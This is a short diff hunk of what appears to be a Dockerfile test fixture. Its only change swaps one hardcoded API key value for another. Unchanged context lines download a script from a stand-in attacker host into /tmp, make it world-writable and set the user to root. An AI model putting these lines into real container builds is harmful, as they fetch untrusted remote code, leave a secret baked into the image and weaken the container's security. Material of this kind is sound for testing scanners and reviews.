@@ -8,6 +8,6 @@ ADD https://evil-example.com/payload.sh /tmp/payload.sh
 
 RUN chmod 777 /tmp/payload.sh
 
-ENV API_KEY=super-secret-test-key1
+ENV API_KEY=super-secret-test-key2
 
 USER root
